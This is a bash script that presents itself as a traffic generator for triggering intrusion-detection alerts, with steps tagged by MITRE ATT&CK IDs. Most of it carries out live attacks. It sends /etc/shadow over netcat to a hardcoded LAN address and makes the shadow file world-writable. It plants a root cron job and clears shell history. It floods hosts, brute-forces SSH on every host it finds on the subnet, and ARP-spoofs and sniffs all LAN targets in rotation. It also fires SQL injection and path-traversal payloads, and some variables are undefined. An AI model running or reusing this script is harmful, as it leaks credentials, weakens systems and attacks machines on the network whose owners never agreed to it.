#!/bin/bash

# ============================================
echo "case 1: NETWORK VISIBILITY + TRAFFIC SCRIPT "
# ============================================

INTERVAL=3

echo "[+] Starting Network Analysis..."

# ============================================
echo " case 2: ROOT CHECK "
# ============================================
if [[ $EUID -ne 0 ]]; then
    echo "[!] Run as root"
    exit 1
fi

# ============================================
echo " case 3: NETWORK DETECTION "
# ============================================
INTERFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
LOCAL_IP=$(ip -4 addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
GATEWAY=$(ip route | awk '/default/ {print $3}' | head -n1)
PUBLIC_IP=$(timeout 5 curl -s https://ifconfig.me || echo "Unavailable")

echo "----------------------------------"
echo "[+] Interface : $INTERFACE"
echo "[+] Local IP  : $LOCAL_IP"
echo "[+] Gateway   : $GATEWAY"
echo "[+] Public IP : $PUBLIC_IP"
echo "----------------------------------"

# ============================================
echo " case 4: WIFI CHECK "
# ============================================
if [[ "$INTERFACE" == wlan* ]]; then
    echo "[!] WiFi detected (limited visibility)"
fi

# ============================================
echo " case 5 STATUS ANALYSIS "
# ============================================
if [[ "$LOCAL_IP" == 127.* ]]; then
    echo "[+] Status : Loopback"
elif [[ "$LOCAL_IP" == 192.168.* ]] || [[ "$LOCAL_IP" == 10.* ]]; then
    echo "[+] Status : Private LAN"
else
    echo "[+] Status : Public Interface"
fi

echo "----------------------------------"
echo "[+] Analysis Complete"

# ============================================
echo " case 6: INSTALL REQUIREMENTS "
# ============================================
echo "++++++++ Installing Requirements ++++++++"

declare -A tool_map=(
    ["nmap"]="nmap"
    ["hping3"]="hping3"
    ["nc"]="netcat-traditional"
    ["hydra"]="hydra"
    ["arpspoof"]="dsniff"
    ["crunch"]="crunch"
    ["bettercap"]="bettercap"
    ["nikto"]="nikto"
    ["dnsutils"]="dnsutils"
    ["snmp"]="snmp"
    ["snmpwalk"]="snmp"
    ["curl"]="curl"
    ["sqlmap"]="sqlmap"
  ["socat"]="socat"
["smbclient"]="smbclient"
["sipp"]="sipp"
["openssl"]="openssl"
["netstat"]="net-tools"   
)

apt update -qq

for tool in "${!tool_map[@]}"; do

    pkg=${tool_map[$tool]}

    if command -v "$tool" &>/dev/null; then
        echo "[✓] $tool already installed"
    else
        echo "[!] Installing $pkg"
        apt install -y "$pkg" -qq
    fi

done

# ============================================
echo " case 7: INSTALL RESPONDER "
# ============================================
if ! command -v responder &>/dev/null; then

    echo "[!] Installing Responder..."

    apt install -y git python3-pip -qq

    if [[ ! -d /opt/Responder ]]; then
        git clone https://github.com/lgandx/Responder.git /opt/Responder
    fi

    ln -sf /opt/Responder/Responder.py /usr/local/bin/responder

    chmod +x /opt/Responder/Responder.py

    echo "[✓] Responder Installed"

else
    echo "[✓] Responder already installed"
fi

# ============================================
echo " case 8: START SERVICES "
# ============================================
echo "+++++++ Starting Required Services +++++++"

declare -A svc_pkg=(
    ["apache2"]="apache2"
    ["ssh"]="openssh-server"
    ["snmpd"]="snmpd"
    ["smbd"]="samba"
)

for svc in "${!svc_pkg[@]}"; do

    pkg=${svc_pkg[$svc]}

    if ! systemctl list-unit-files | grep -q "^$svc"; then
        echo "[!] Installing service package $pkg"
        apt install -y "$pkg" -qq
    fi

    echo "[+] Starting service $svc"

    systemctl enable "$svc" --now >/dev/null 2>&1

done

echo "[+] Services Ready"

# ============================================
echo " case 9: URL FILE "
# ============================================
echo "+++++++ Preparing URL File ++++++++"

f="type"

cat <<EOF > "$f"
http://testmynids.org/uid/index.html
https://102.130.113.30
https://102.130.113.42
https://102.130.113.9
https://102.130.115.59
https://102.130.117.167
https://102.130.117.25
https://102.130.119.48
https://102.130.127.117
https://102.205.44.23
https://102.205.44.250
https://102.205.44.36
https://102.205.44.5

EOF

echo "[+] URL file created"
target_ip=$(getent ahostsv4 "$target" | awk '{print $1; exit}')
# ============================================
echo " CURL DOWNLOAD TEST "
# ============================================
echo "+++++++ Curling External IPs +++++++"

while read -r url; do

    echo "[*] Trying : $url"

    timeout 8 curl \
        -L \
        --connect-timeout 3 \
        --max-time 5 \
        -k \
        -s \
        -O \
        "$url"

done < <(grep -E "^https" "$f")

echo "[+] Downloads Complete"

# ============================================
echo " FUNCTION : CHECK PORT "
# ============================================
check_port() {

    nc -z -w2 "$GATEWAY" "$1" >/dev/null 2>&1

    return $?
}

# ============================================
echo " HTTP / HTTPS / SSL "
# ============================================
echo "+++++++ HTTP / HTTPS TEST +++++++"

if command -v curl &>/dev/null; then

    while read -r url; do

        echo "[*] HTTP Request : $url"

        timeout 8 curl \
            -s \
            --connect-timeout 3 \
            --max-time 5 \
            "$url" \
            >/dev/null 2>&1

        timeout 8 curl \
            -s \
            -A "sqlmap/1.0" \
            --connect-timeout 3 \
            --max-time 5 \
            "$url" \
            >/dev/null 2>&1

        sleep "$INTERVAL"

    done < "$f"

fi

# ============================================
echo " DNS "
# ============================================
echo "+++++++ DNS TEST +++++++"

if command -v nslookup &>/dev/null; then

    while read -r url; do

        host=$(echo "$url" | awk -F/ '{print $3}')

        echo "[*] NSLOOKUP : $host"
        timeout 5 nslookup $LOCAL_IP >/dev/null 2>&1
        timeout 5 nslookup "$host" >/dev/null 2>&1
        timeout 5 nslookup "$GATEWAY" >/dev/null 2>&1
        timeout 5 nslookup \
            "random$(shuf -i 1000-9999 -n 1).test" \
            >/dev/null 2>&1

        sleep "$INTERVAL"

    done < "$f"

fi

# ============================================
echo " case 10 :PHASE 1 : LAYER 7 TRAFFIC "
# ============================================
echo "+++++++ Generating L7 Traffic +++++++"

while read -r url; do

    host=$(echo "$url" | awk -F/ '{print $3}')

    echo "[*] L7 Traffic : $host"

    timeout 8 curl \
        -s \
        -A "sqlmap/1.0" \
        --connect-timeout 3 \
        --max-time 5 \
        "$url" \
        >/dev/null 2>&1

    timeout 5 nslookup \
        "random$(shuf -i 1000-9999 -n 1).test" \
        >/dev/null 2>&1

    timeout 7 bash -c \
        "echo | openssl s_client -connect $host:443 -brief" \
        >/dev/null 2>&1

done < "$f"

# ============================================
echo " EXTRA DNS TRAFFIC "
# ============================================
echo "+++++++ Extra DNS Traffic +++++++"

if command -v nslookup &>/dev/null; then

    while read -r url; do

        host=$(echo "$url" | awk -F/ '{print $3}')

        timeout 5 nslookup "$host" >/dev/null 2>&1
        timeout 5 nslookup "$host" >/dev/null 2>&1

    done < "$f"

fi

# ============================================
echo " DIG TRAFFIC "
# ============================================
echo "+++++++ DIG Traffic +++++++"

if command -v dig &>/dev/null; then

    while read -r url; do

        host=$(echo "$url" | awk -F/ '{print $3}')

        timeout 5 dig "$host" >/dev/null 2>&1
        timeout 5 dig "$host" >/dev/null 2>&1

    done < "$f"

fi

# ============================================
echo " PORT TESTS "
# ============================================
echo "+++++++ Gateway Port Checks +++++++"

ports=(21 22 23 25 53 80 110 139 143 443 445 3306 3389 8080)

for port in "${ports[@]}"; do

    echo "[*] Checking Port $port"

    if check_port "$port"; then
        echo "[OPEN] Port $port"
    else
        echo "[CLOSED] Port $port"
    fi

done

# ============================================
# FINAL
# ============================================
echo "----------------------------------"
echo "[+] Script Completed Successfully"
echo "----------------------------------"
# ==============================
echo " TCP SESSION TIMING "
# ==============================
echo "[+] TCP session timing"

if command -v nc &>/dev/null; then

    # Internal traffic (LAN / Gateway)
    for port in 80 443 22 445 53; do
        timeout 3 nc -z "$GATEWAY" "$port" >/dev/null 2>&1
    done

    # External traffic (Internet)
    for port in 80 443 22; do
        timeout 3 nc -z $target $port >/dev/null 2>&1
    done

fi

sleep $INTERVAL
echo "[✓] TCP Done"
# =========================
echo " SSL/TLS (HTTPS handshake) "
# =========================
echo "[+] SSL/TLS traffic"

timeout 5 bash -c "echo | openssl s_client -connect google.com:443 -brief" >/dev/null 2>&1
# ==============================
echo " SMTP / POP3 / IMAP "
# ==============================
if command -v nc &>/dev/null; then

    
    check_port 25 && echo "QUIT" | nc $GATEWAY 25 > /dev/null 2>&1
    check_port 110 && echo "QUIT" | nc $GATEWAY 110 > /dev/null 2>&1
    check_port 143 && echo "a logout" | nc $GATEWAY 143 > /dev/null 2>&1
    sleep $INTERVAL

fi
echo "[+] IMAP connection simulation"

timeout 3 bash -c \
  "echo a LOGOUT | nc imap.gmail.com 143" \
  >/dev/null 2>&1
# ==============================
echo " SMB / CIFS "
# ==============================
if command -v smbclient &>/dev/null; then


    check_port 445 && smbclient -L //$GATEWAY -N > /dev/null 2>&1


fi

# ==========================================
echo " Network Statistics Snapshot "
# ==========================================
echo "[+] Capturing connection state"

ss -antp
netstat -ant 2>/dev/null


# ==========================================
echo " SMTP-like Connection Behavior "
# ==========================================
echo "[+] SMTP connection simulation"

timeout 5 bash -c \
  "echo QUIT | nc smtp.gmail.com 587" \
  >/dev/null 2>&1
# ==============================
echo " MS SQL (TDS) "
# ==============================
if command -v nc &>/dev/null; then


    check_port 1433 && nc -z $GATEWAY 1433 > /dev/null 2>&1


fi

# ==============================
echo " SIP "
# ==============================
if command -v sipp &>/dev/null; then

    check_port 5060 && sipp -sn uac $GATEWAY -p 5060 > /dev/null 2>&1


fi

# ==============================
echo " DHCP (limited on WiFi) "
# ==============================
if command -v dhclient &>/dev/null; then


    timeout 10 dhclient -v $INTERFACE > /dev/null 2>&1


fi

# ==============================

echo "[+] Running full Layer 7 simulation..."
echo "[+] Press CTRL+C to stop"

# =========================
echo " IMAP "
# =========================
echo "[+] IMAP traffic"
timeout 2 bash -c "echo a LOGOUT | nc imap.gmail.com 143" 2>/dev/null


echo "+++++++ Anti-Forensics / Log Clearing +++++++"
# This is a high-confidence alert for EDRs
touch /tmp/evil.sh
rm -f /tmp/evil.sh
history -c && echo "[!] Bash history cleared."


echo " case 11: Triggers alerts for "Adversary-in-the-Middle" behavior "

echo "---- C. EXFILTRATION & C2 (T1041/T1048) ---- "
echo "+++++++ Data Exfiltration Simulation +++++++"
# Simulate sending shadow/passwd files over raw TCP
(cat /etc/passwd | nc -w 2 $LOCAL_IP 8080) & 
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | nc -w 2 $LOCAL_IP 80 &



# ============================================
echo " case 12: SQLMAP TEST "
# ============================================
echo "+++++++ SQLMAP TEST +++++++"

TARGET_URL="http://${LOCAL_IP}:3000"
if command -v sqlmap &>/dev/null; then
    
    echo "[*] Starting automated scan on $TARGET_URL..."
    
    # Using a loop if you want it to re-scan periodically, 
    # otherwise, you can remove the 'while' and 'done' lines.
    for i in {1..5}; do
        echo "[*] SQLMAP Session Started: $(date)"

        timeout 20 sqlmap \
            -u "$TARGET_URL" \
            --batch \
            --random-agent \
            --level=1 \
            --risk=1 \
            --threads=2 \
            --timeout=5 \
            --retries=1 \
            >/dev/null 2>&1

        echo "[+] Cycle complete. Sleeping for $INTERVAL seconds..."
        sleep "$INTERVAL"
    done
else
    echo "[!] Error: sqlmap is not installed."
fi

if command -v sqlmap &>/dev/null; then

    while read -r url; do

        echo "[*] SQLMAP : $url"

        timeout 20 sqlmap \
            -u "$url" \
            --batch \
            --random-agent \
            --level=1 \
            --risk=1 \
            --threads=2 \
            --timeout=5 \
            --retries=1 \
            >/dev/null 2>&1

        sleep "$INTERVAL"

    done < "$f"

else
    echo "[!] sqlmap not installed"

fi


# ============================================
echo " case 13: T1046: NETWORK SERVICE DISCOVERY "
# ============================================
echo "[!] Triggering T1046 (Scanning Common Ports)..."
COMMON_PORTS=(21 22 23 25 80 443 445 3306 3389 8080)
SUBNET_PREFIX=$(echo "$LOCAL_IP" | cut -d. -f1-3)

for port in "${COMMON_PORTS[@]}"; do
    # Probing the local gateway for standard services
    (timeout 1 bash -c "echo > /dev/tcp/$GATEWAY/$port") 2>/dev/null && \
    echo "[+] Found Open Port on Gateway: $port"
done
# ============================================
echo " case 14: T1021.004: REMOTE SERVICES (SSH) "
# ============================================
echo "[!] Triggering T1021.004 (SSH Lateral Movement Attempt)..."
# Simulating an automated SSH connection attempt to a likely target
TARGET_NODE="${SUBNET_PREFIX}.100" # Example target IP
ssh -o ConnectTimeout=2 -o BatchMode=yes -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null fakeuser@"$TARGET_NODE" "id" 2>/dev/null || \
    echo "[-] SSH attempt to $TARGET_NODE recorded."
# ============================================
echo " case 15: T1071.001: APPLICATION LAYER PROTOCOL (WEB) "
# ============================================
echo "[!] Triggering T1071.001 (Simulating C2 Traffic)..."
for i in {1..3}; do
    # Simulates periodic "Beaconing" or heartbeats to an external domain
    curl -s -A "Mozilla/5.0 (C2-Emulator)" http://google.com > /dev/null
    sleep "$INTERVAL"
done

# ============================================
echo " case 16: T1048: EXFILTRATION OVER ALTERNATIVE PROTOCOL "
# ============================================
echo "[!] Triggering T1048 (Simulating Data Exfiltration)..."
# Encodes a small string and "exfiltrates" it via a POST request
DATA_TO_EXFIL=$(echo "SENSITIVE_DATA_INTERNAL_IP_$LOCAL_IP" | base64)
curl -X POST -d "data=$DATA_TO_EXFIL" https://httpbin.org/post > /dev/null
echo "[+] Exfiltration simulation finished."

echo "[+] Starting MITRE ATT&CK Trigger Script..."

echo " case 17 1. Discovery (T1082, T1033, T1016, T1087) "
echo "[!] Triggering Discovery Alerts..."
whoami && id                       # User Discovery
uname -a && cat /etc/issue         # System Info Discovery
ip addr && route -n                # Network Config Discovery
cat /etc/passwd && groups          # Account Discovery
netstat -antp 2>/dev/null          # Network Connection Discovery

echo " case 18: Credential Access (T1003.008) "
echo "[!] Triggering Credential Access (Shadow File)..."
cat /etc/shadow > /tmp/shadow_bak 2>/dev/null
ls -la ~/.ssh/ 2>/dev/null         # Private Key Discovery

echo " Create a malicious-looking cron job "
echo "* * * * * root /usr/bin/echo 'Persistence Test'" | tee /etc/cron.d/persist_test > /dev/null

echo " --- CREDENTIAL ACCESS --- "
echo " case 19: T1555: Credentials from Password Stores "
grep -r "password" /home/$(whoami)/.config/ 2>/dev/null
echo " --- PERSISTENCE --- "
echo " case 20: T1546.004: Unix Shell Configuration Modification "
echo "alias ls='ls -la'" >> ~/.bashrc

echo "  --- EXFILTRATION --- "
echo " case 21: T1011: Exfiltration Over Other Network Medium (DNS tunneling simulation) "
nslookup attacker-controlled-domain.com

echo " case 22 Defense Evasion (T1070.002, T1562.001) "
echo "[!] Triggering Defense Evasion..."
history -c && rm -f ~/.bash_history # Indicator Removal (Clear History)
ufw status                    # Check Firewall (often flagged with disable)

echo " case 23: Command and Control / Proxy (T1090) "
echo "[!] Triggering Proxy/Tunneling Alert..."
echo " Simulated SSH tunnel (will time out quickly, but command is logged) "
timeout 2s ssh -D 1080 -N localhost 2>/dev/null

echo "[+] Execution Finished. Check /var/log/syslog or /var/log/auth.log"

echo " case 24: T1222.002: File and Directory Permissions Modification "
chmod 777 /etc/shadow
echo " case 25: T1036: Masquerading (Rename a process to look legitimate) "
# This command copies your home folder while skipping the problematic cache
mkdir -p /home/dark && sudo touch /home/dark/abc.txt
echo "Your text here" | sudo tee /home/dark/abc.txt > /dev/null
sudo cp /home/dark/abc.txt /home/dark/destination.txt
sudo rm /home/dark/abc.txt

# Define safe dummy files for simulation
DUMMY_RC="/tmp/fake_rc_local"
DUMMY_LOGOUT="/tmp/fake_bash_logout"
DUMMY_CONFIG="/tmp/fake_bashrc"

echo "--- SAFE SESSION & PERSISTENCE SIMULATION ---"

echo "case 26 & 30: T1546.004 - Simulated Short Timeout"
# SAFER: Writing to a dummy config instead of your real ~/.bashrc
echo "export TMOUT=5" >> $DUMMY_CONFIG
echo "[SAFE] Created $DUMMY_CONFIG with timeout rules."

echo "case 27: T1037.004 - Boot/Logon Scripts (RC Scripts)"
# SAFER: Using a /tmp file instead of /etc/rc.local (avoids root/system changes)
touch $DUMMY_RC
chmod +x $DUMMY_RC
echo "echo 'System Booting...'" >> $DUMMY_RC
echo "[SAFE] Simulated legacy boot script at $DUMMY_RC"

echo "case 28 & 31: T1070.006 - Timestomping"
# SAFER: Timestomping the dummy logout file instead of the real one
touch $DUMMY_LOGOUT
touch -a -m -t 202301010101.01 $DUMMY_LOGOUT
echo "[SAFE] Timestomped $DUMMY_LOGOUT to Jan 1, 2023."

echo "case 29 & 32: T1546.004 - Abuse Logout Scripts"
# SAFER: Appending a harmless logger instead of a background process
echo "echo 'Logout trigger detected' >> /tmp/sim_audit.log" >> $DUMMY_LOGOUT
echo "[SAFE] Added logout trigger to $DUMMY_LOGOUT"

echo "--- Simulation Complete ---"
echo "Check /tmp to see the files created. No system settings were changed."


# Downloads a large test file to trigger "High Data Transfer" alerts
curl -O http://ipv4.download.thinkbroadband.com/10MB.zip

echo "+++++++ A. Reconnaissance Attacks +++++++"
echo " case 33 Uses the Nmap Scripting Engine (NSE) to probe for vulnerabilities "
nmap --script vuln -T4 $LOCAL_IP
echo "+++++++ Reconnaissance Attacks +++++++"
nmap -sV -T4 $LOCAL_IP & 
TARGET_OTHER="${SUBNET_PREFIX}.50"
nmap -T5 --min-parallelism 100 $target
nmap -T5 --min-parallelism 100 $LOCAL_IP
timeout 5 nmap $LOCAL_IP
timeout 5 nmap -A -T4 $LOCAL_IP
timeout 5 nmap -p- $LOCAL_IP
timeout 5 nmap -sC -sV -T4 -p- $LOCAL_IP
timeout 5 nmap -sS $LOCAL_IP
echo "+++++++++ Web Scanner ++++++++++"
nikto -h http://$LOCAL_IP
timeout 30 nikto -h http://$LOCAL_IP > /dev/null 2>&1 &
nikto -h $LOCAL_IP -Tuning 123456789abc -C all -Display V -useragent "Mozilla/5.0"

#ommand: Forward traffic from local port 8080 to an external address (e.g., Google DNS).
timeout 20 socat TCP4-LISTEN:8080,fork TCP4:8.8.8.8:53

# Simulates an attempt to read the Linux password file
data=$(echo "../../../etc/passwd" | base64 -w 0)
curl -X POST -d "exfil=$data" http://$LOCAL_IP:3000

# Simulates a login bypass or data dump attempt
data=$(echo "' OR 1=1 --" | base64 -w 0)
curl -X POST -d "exfil=$data" http://$LOCAL_IP:3000

# Encodes a basic script tag to see if the WAF decodes and inspects it
data=$(echo "<script>alert('Injection-Test')</script>" | base64 -w 0)
curl -X POST -d "exfil=$data" http://$LOCAL_IP:3000

# Generate 10,000 strings, encode them, and stream over port 8080
timeout 30 crunch 5 5 -c 10000 | base64 | nc -w 3 $LOCAL_IP 3000

for i in {1..20}; do
  DOMAIN=$(cat /dev/urandom | tr -dc 'a-z' | fold -w 12 | head -n 1).com
  nslookup $DOMAIN
done





echo "case 34 :B. Network-Based Attacks "

timeout 5 ping -f $LOCAL_IP

timeout 5 ping -f $target

echo "+++++++ C. SYN Flood +++++++"

timeout 5 hping3 -S --flood -p 445 $LOCAL_IP
timeout 5 hping3 -S --flood -p 445 $target

hping3 -S --flood -V -p 443 "$LOCAL_IP"

echo "+++++++ UDP Flood +++++++"

timeout 5 hping3 --udp --flood -p 80 $target



echo "+++++++ heavy payload flood +++++++"

timeout 5 hping3 -S --flood -d 1200 $LOCAL_IP

timeout 5 hping3 -S --flood -d 1200 $target

echo "+++++++ the Xmas flood +++++++"

timeout 5 hping3 -X --flood --rand-source -d 1200 $LOCAL_IP



echo "+++++++ UDP Bandwidth Flood +++++++"
 
timeout 5 hping3 --udp --flood -d 1400 -p 53 $LOCAL_IP


echo "+++++++ G. DNS Attacks +++++++"

timeout 5 hping3 --udp -p 53 --flood $LOCAL_IP
echo "+++++++ Denial of Service Simulation +++++++"
timeout 5 hping3 -S --flood -p 445 $LOCAL_IP > /dev/null 2>&1 &
timeout 5 hping3 --udp --flood -d 1200 -p 53 $LOCAL_IP > /dev/null 2>&1 &


echo "+++++++ D. Port-Based Attacks +++++++"
 
nc -zv $LOCAL_IP 22

nc -zv $LOCAL_IP 902



echo "+++++++ E. Payload-Based Attacks +++++++"

echo "malware attack exploit" | nc $LOCAL_IP 80
echo "malware attack exploit" | nc -v -w 2 $LOCAL_IP 80



echo "+++++++ 1. Send the Payload +++++++"

echo "malware attack exploit" | nc -v -w 2 $LOCAL_IP 80

echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | nc -v $LOCAL_IP 80

echo "+++++++ 2. Test for Injection Vulnerabilities +++++++"

echo "; id; whoami" | nc $LOCAL_IP 80



echo "+++++++ 3. Identify the Service (Banner Grabbing) +++++++"

printf "HEAD / HTTP/1.1\r\nHost: $LOCAL_IP\r\n\r\n" | nc -v $LOCAL_IP 80



echo "+++++++ 4.  Check Port 902 +++++++"

echo "test" | nc -v $LOCAL_IP 902


echo " case 35 : Password Based Attack "
echo "+++++++ E. Brute Force Attacks +++++++"
whoami
cu=$(whoami)
timeout 10 hydra -l "$cu" -P <(crunch 4 4 123) -t 1 -vV ssh://"$LOCAL_IP"
# Brute force SMB (Windows File Sharing) - triggers account lockout alerts
timeout 10 hydra -L <(crunch 4 123) -P <(crunch 4 4 123) "$LOCAL_IP" smb

for port in 21 23 445; do
  timeout 5 hydra -l admin -P <(crunch 4 4 123) ssh://$LOCAL_IP -s $port
done
# ---- D. ADVERSARY-IN-THE-MIDDLE (T1557) ----
echo "+++++++ Responder (LLMNR/NBT-NS) +++++++"
timeout 10 responder -I $INTERFACE -dwv > /dev/null 2>&1 &

# Send a sensitive file via a simple TCP connection (Data Leakage alert)
cat /etc/shadow | nc  192.168.2.17 8080


echo "+++++++ H. ARP Spoofing (MITM Simulation) +++++++"

timeout 10 arpspoof -t $LOCAL_IP $GATEWAY

echo "+++++++++ QL Injection pattern ++++++++++"

curl "http://$LOCAL_IP/index.php?id=' OR 1=1--"
curl -I https://example.com

echo "+++++++++ Path Traversal pattern ++++++++++"
timeout 6 curl "http://$LOCAL_IP/../../etc/passwd"

echo "+++++++++ Generate Sensitive Data Exfiltration Alerts ++++++++++++"
echo "SSH PRIVATE KEY: -----BEGIN RSA PRIVATE KEY-----" | nc -v $LOCAL_IP 80

echo "+++++++++++ SNMP Enumeration ++++++++++"
timeout 10 snmpwalk -v2c -c public $LOCAL_IP

echo " case 36: ---- B. CREDENTIAL ACCESS & LATERAL MOVEMENT (T1110) ---- "
echo "+++++++ External Network Brute Force Simulation +++++++"

# 1. Discover other active IPs (Strictly excluding LOCAL_IP and GATEWAY)
echo "[*] Scanning for OTHER targets in $LOCAL_IP/24..."
SUBNET="${LOCAL_IP%.*}.0/24"
mapfile -t LIVE_HOSTS < <(nmap -n -sn "$SUBNET" | grep "Nmap scan report" | awk '{print $5}' |grep -vE "(${LOCAL_IP//./\\.}|${GATEWAY//./\\.}|127\.0\.0\.1)")

if [ ${#LIVE_HOSTS[@]} -eq 0 ]; then
    echo "[!] No other targets detected on the network."
else
    echo "[+] Found ${#LIVE_HOSTS[@]} external targets: ${LIVE_HOSTS[*]}"
    
    for host in "${LIVE_HOSTS[@]}"; do
        # Trigger Brute Force Alert (T1110)
        echo "[!] Launching SSH Brute Force against $host..."
        hydra -l root -P <(crunch 4 4 123) $host ssh -t 4 -f & 

        # Trigger Network Discovery Alert (T1046)
        echo "[!] Launching Intense Port Scan against $host..."
        nmap -sV -T4 -p 22,80,443,445 $host 

        # Trigger Vulnerability Scanning Alert (T1595.002)
        echo "[!] Launching Web Scan against $host..."
        nikto -h http://$host -Tuning 123489 > /dev/null 2>&1 &
    done
fi




echo " case 37: ++++++++++ MIM +++++++++++++"
echo "++++++++++ MIM: Dynamic Target Switching +++++++++++++"

echo "++++++++++ MIM: Infinite Multi-Target Rotation +++++++++++++"

# 1. Identify the Gateway
GATEWAY=$(ip route | grep default | awk '{print $3}')

# 2. Discover all active targets
echo "[!] Scanning network for all active targets..."

bettercap -iface "$INTERFACE" -eval "net.probe on; sleep 7; net.show; quit" > discovery.txt

# 3. Create an array of ALL found IPs (excluding self and gateway)
TARGETS=($(grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" discovery.txt | grep -v -e "$LOCAL_IP" -e "$GATEWAY" -e "0.0.0.0" | sort -u))

if [ ${#TARGETS[@]} -eq 0 ]; then
    echo "[-] No targets found. Check if the network is empty or protected."
    rm discovery.txt
    exit 1
fi

echo "[+] Found ${#TARGETS[@]} targets: ${TARGETS[*]}"

# 4. Generate the ticker command string dynamically for ALL targets
TICKER_CMD=""
for ip in "${TARGETS[@]}"; do
    TICKER_CMD+="echo '[#] Attacking $ip'; set arp.spoof.targets $ip; arp.spoof on; sleep 10; arp.spoof off; "
done

# 5. Launch Bettercap with the full rotation
 bettercap -iface "$INTERFACE" -eval "
  set net.sniff.verbose true;
  net.sniff on;
  set arp.spoof.fullduplex true;
  set ticker.commands '$TICKER_CMD';
  set ticker.period 1;
  ticker on;
"

rm discovery.txt
